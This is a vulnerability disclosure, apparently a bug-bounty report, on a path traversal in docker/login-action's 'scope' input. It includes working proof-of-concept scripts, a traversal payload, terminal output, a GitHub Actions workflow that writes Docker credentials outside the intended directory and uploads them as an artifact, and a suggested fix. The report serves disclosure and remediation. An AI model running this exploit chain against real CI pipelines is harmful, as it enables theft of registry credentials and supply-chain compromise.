# Path Traversal → Arbitrary Docker Credential Write (Scoped Buildx Config)

## Summary

A path traversal vulnerability exists in the login action when processing the `scope` input.
The function responsible for determining the Buildx configuration directory constructs filesystem paths using:

```
path.join(baseDir, scope)
```

without validating or constraining `scope`.
Because `path.join` normalizes `../` segments, an attacker-controlled `scope` can escape the intended Buildx directory and influence the `DOCKER_CONFIG` environment variable.
Docker then writes `config.json` to this attacker-controlled location during `docker login`.
This results in an arbitrary credential file write primitive.

## Impact

If an attacker can control `scope` (for example via `workflow_dispatch`, PR inputs, composite actions, or untrusted variables), they can:

### Credential Exfiltration

Write Docker authentication material outside the sandbox:

- Workspace directories
- Artifact paths
- Cache paths
- Uploaded directories

Later workflow steps may upload or expose the file.

### Supply-Chain Confusion

Poison filesystem locations used by later build steps:

- Overwrite `.docker/config.json`
- Confuse subsequent docker commands
- Inject attacker registry auth
- Pull/push from attacker registry

### CI Secret Exposure

Chainable in real pipelines:

1. Write credentials to uploadable location
2. Artifact upload publishes it
3. Attacker retrieves registry token

## Root Cause

The scope value is concatenated into a filesystem path without canonical validation:

```
scopeToConfigDir(...)
  -> path.join(baseDir, scope)
      (no traversal check)
```

Normalized `../` escapes the intended directory.
The resulting path is exported into:

```
DOCKER_CONFIG=<attacker-controlled-path>
```

Docker then creates:

```
$DOCKER_CONFIG/config.json
```

## Proof of Concept

### 1. Clone the project

```bash
git clone https://github.com/docker/login-action
cd login-action
```

### 2. Create a fake docker binary

```bash
mkdir -p /tmp/pocbin /tmp/login-poc

cat > /tmp/pocbin/docker <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

cmd="$1"; shift || true

printf 'cmd=%s DOCKER_CONFIG=%s args=%s\n' \
"$cmd" "${DOCKER_CONFIG:-}" "$*" >> /tmp/login-poc/invocations.log

if [ "$cmd" = "login" ]; then
  cat >/dev/null || true
  mkdir -p "${DOCKER_CONFIG}"
  echo '{"auths":{"example":{"auth":"dGVzdDp0ZXN0"}}}' > "${DOCKER_CONFIG}/config.json"
fi

exit 0
EOF

chmod +x /tmp/pocbin/docker
```

### 3. Execute the action with malicious scope

```bash
PATH="/tmp/pocbin:$PATH" \
RUNNER_TEMP="/tmp/runner" \
INPUT_USERNAME="test" \
INPUT_PASSWORD="test" \
INPUT_SCOPE='../../../../../../tmp/pwn' \
INPUT_LOGOUT='false' \
node dist/index.js
```

### 4. Verify exploitation

```bash
cat /tmp/login-poc/invocations.log
ls -la /tmp/pwn
cat /tmp/pwn/config.json
```

### Expected Output (Proof)

DOCKER_CONFIG escaped sandbox:

```
cmd=login DOCKER_CONFIG=/tmp/pwn args=...
```

Credential file written outside intended directory:

```
/tmp/pwn/config.json exists
```

This confirms attacker-controlled file write via scope traversal.


My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/login-action]
└─$ mkdir -p /tmp/pocbin /tmp/login-poc
cat > /tmp/pocbin/docker <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
cmd="$1"; shift || true
printf 'cmd=%s DOCKER_CONFIG=%s args=%s\n' "$cmd" "${DOCKER_CONFIG:-}" "$*" >> /tmp/login-poc/invocations.log
if [ "$cmd" = "login" ]; then
  cat >/dev/null || true
  mkdir -p "${DOCKER_CONFIG}"
  echo '{"auths":{"example":{"auth":"dGVzdDp0ZXN0"}}}' > "${DOCKER_CONFIG}/config.json"
fi
exit 0
EOF
chmod +x /tmp/pocbin/docker

                                                                                
┌──(keshav㉿kali)-[~/Downloads/login-action]
└─$ PATH="/tmp/pocbin:$PATH" \
RUNNER_TEMP="/tmp/runner" \
INPUT_USERNAME="test" \
INPUT_PASSWORD="test" \
INPUT_SCOPE='../../../../../../tmp/pwn' \
INPUT_LOGOUT='false' \
node dist/index.js

::save-state name=isPost::true
::save-state name=logout::false
::save-state name=registries::[{"registry":"docker.io","configDir":"/tmp/pwn"}]
Logging into docker.io (scope ../../../../../../tmp/pwn)...
::debug::Exec.getExecOutput: docker login --password-stdin --username test docker.io
Login Succeeded!
                                                                                
┌──(keshav㉿kali)-[~/Downloads/login-action]
└─$ cat /tmp/login-poc/invocations.log
ls -la /tmp/pwn
cat /tmp/pwn/config.json

cmd=login DOCKER_CONFIG=/tmp/pwn args=--password-stdin --username test docker.io
total 4
drwxrwxr-x  2 keshav keshav  60 Feb 18 20:46 .
drwxrwxrwt 18 root   root   460 Feb 18 20:46 ..
-rw-rw-r--  1 keshav keshav  46 Feb 18 20:46 config.json
{"auths":{"example":{"auth":"dGVzdDp0ZXN0"}}}

```
---

## Exploit by Chaining:
The proof-of-concept demonstrates that the `scope` input is used to construct the Docker configuration directory without enforcing a path boundary. By supplying a traversal payload (`../../../../leak`), the workflow causes the action to set `DOCKER_CONFIG` to a location outside its intended Buildx directory and write a valid `config.json` containing authentication material there. The workflow then successfully reads and uploads that file as an artifact, proving the write occurred in an attacker-controlled, reachable path. This shows the vulnerability is not only a directory escape but an exploitable primitive: any workflow that later uploads, caches, or otherwise exposes workspace or temporary paths could unintentionally leak Docker credentials, and any workflow that forwards untrusted inputs into `scope` could be abused to redirect secret material to attacker-accessible locations.

Steps to Reproduce — Scoped Path Traversal → Arbitrary Docker Config Write

Overview

The following procedure demonstrates that an attacker-controlled `scope` value can escape the intended Buildx configuration directory and force Docker credentials to be written to an arbitrary filesystem location inside the GitHub Actions runner. No local environment is required — the issue can be reproduced entirely using a GitHub repository.

**1. Create a Proof-of-Concept Workflow**

In the target repository, the tester creates a workflow file:

```
.github/workflows/poc-scope-traversal.yml
```

with the following content:

```yaml
name: poc-scope-traversal
on:
  workflow_dispatch:
    inputs:
      scope:
        description: "Traversal payload"
        required: true
        default: "../../../../leak"

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install fake docker (safe deterministic test)
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/bin"
          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
          #!/usr/bin/env bash
          set -euo pipefail
          cmd="$1"; shift || true
          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker-invocations.log"
          if [ "$cmd" = "login" ]; then
            cat >/dev/null || true
            mkdir -p "${DOCKER_CONFIG}"
            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
            exit 0
          fi
          if [ "$cmd" = "logout" ]; then
            exit 0
          fi
          exit 0
          EOF
          chmod +x "$RUNNER_TEMP/bin/docker"
          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
      - name: Run vulnerable login action
        uses: ./
        with:
          username: demo
          password: demo
          scope: ${{ inputs.scope }}
          logout: false

      - name: Verify escaped write
        id: verify
        shell: bash
        run: |
          set -euo pipefail
          echo "RUNNER_TEMP=$RUNNER_TEMP"
          echo "HOME=$HOME"
          echo "---- docker invocation log ----"
          cat "$RUNNER_TEMP/docker-invocations.log"
          CFG="$(sed -n 's/.*DOCKER_CONFIG=\(.*\) args=.*/\1/p' "$RUNNER_TEMP/docker-invocations.log" | tail -n1)"
          echo "Resolved DOCKER_CONFIG: $CFG"
          test -n "$CFG"
          test -f "$CFG/config.json"
          echo "FOUND escaped config at $CFG/config.json"
          cat "$CFG/config.json"
          echo "cfg=$CFG" >> "$GITHUB_OUTPUT"
      - name: Upload leaked file (exploit chain proof)
        uses: actions/upload-artifact@v4
        with:
          name: leaked-docker-config
          path: ${{ steps.verify.outputs.cfg }}/config.json
          if-no-files-found: error
```

**2. Commit and Push the Workflow**

The tester commits the workflow and pushes it to the repository:

```bash
git checkout -b poc-scope-traversal
git add .github/workflows/poc-scope-traversal.yml
git commit -m "Add scope traversal exploit-chain PoC workflow"
git push -u origin poc-scope-traversal
```

**3. Execute the Workflow**

1. Open the repository Actions tab
2. Select `poc-scope-traversal`
3. Click **Run workflow**
4. Keep the default input:

```
../../../../leak
```

5. Start the run

**4. Expected Result (Vulnerable Behavior)**

During execution, the action logs show the scope being used:

```
Logging into docker.io (scope ../../../../leak)...
```

The verification step then shows that a Docker configuration file was written outside the intended Buildx directory.

Evidence in Logs

The following conditions confirm exploitation:

Filesystem write:

```
$RUNNER_TEMP/leak/config.json exists
```

File contents:

```json
{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}
```

Docker invocation log shows the attacker-controlled path:

```
DOCKER_CONFIG=<escaped location>
```

Artifact — the workflow uploads a downloadable artifact:

```
leaked-docker-config
```

This demonstrates the attacker can control the location where Docker authentication material is written and exfiltrate it.

**5. Expected Result (Patched / Not Vulnerable)**

If the vulnerability is fixed:

- The verification step fails because `config.json` does not exist
- The artifact upload fails due to:

```
if-no-files-found: error
```

**Security Impact Demonstrated**

The reproduction confirms:

- Path traversal via attacker-controlled workflow input
- Control over `DOCKER_CONFIG`
- Arbitrary credential file placement
- Potential credential exfiltration via artifacts or later workflow steps


## Security Impact Classification

Vulnerability Type: Path Traversal → Arbitrary File Write
Primitive: Credential Write / Secret Exfiltration
Attack Vector: Untrusted workflow input
Impact: Supply chain compromise / CI secret leakage

## Recommended Fix

### 1. Canonicalize and constrain path

Resolve the final path and enforce it stays under the base directory:
 
```js
const resolved = path.resolve(baseDir, scope);

if (!resolved.startsWith(baseDir + path.sep)) {
  throw new Error("Invalid scope: path traversal detected");
}
```

### 2. Reject unsafe scope values

Disallow:

- `..`
- absolute paths
- path separators

Example:

```js
if (scope.includes("..") || path.isAbsolute(scope)) {
  throw new Error("Invalid scope");
}
```

### 3. Remove raw concatenation branch

Ensure all scope handling follows the same validation logic.

## Conclusion

The action allows attacker-controlled `scope` values to escape the Buildx configuration directory and control the `DOCKER_CONFIG` path. Because Docker writes credentials to this path, the bug provides a reliable arbitrary credential file write primitive, enabling CI secret exfiltration and supply-chain abuse.
